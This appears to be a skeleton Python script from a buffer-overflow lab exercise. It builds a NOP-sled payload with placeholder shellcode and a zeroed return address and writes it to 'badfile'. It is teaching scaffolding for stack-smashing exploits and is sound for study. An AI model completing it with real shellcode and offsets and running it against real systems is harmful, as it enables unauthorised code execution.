#!/usr/bin/python3
import sys

""" This code constructs a payload to be read into the buffer
and writes the binary payload to "badfile".

First we construct the payload entirely of NOPs to serve as a
nopsled into our shellcode. Next, we insert the shellcode into
the payload. Finally, we insert a return address that will 
instruct the vulnerable program to execute instructions in the 
payload.
"""

# You can use this function to print out your payload in bytes.
# It is not necessary to use this, but it may help you debug.
def bytes_to_hex(arr):
	print(''.join('{:02x}'.format(x) for x in arr))

# Replace the payload with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"
  "\x90\x90\x90\x90"
).encode('latin-1')

# Fill the payload with NOP's
payload = bytearray(0x90 for i in range(517))

# Put the shellcode somewhere in the payload
start = 0           	# Change this number
payload[start:start + len(shellcode)] = shellcode


L = 4 	# Use 4 for 32-bit address and 8 for 64-bit address
      	# You don't need to change this for this lab.

# Decide the return address value
# and put it somewhere in the payload
offset = 0          	# Change this number
ret	= 0x00       	# Change this number


payload[offset:offset + L] = (ret).to_bytes(L,byteorder='little')


# Write the payload to a file
with open('badfile', 'wb') as f:
  f.write(payload)
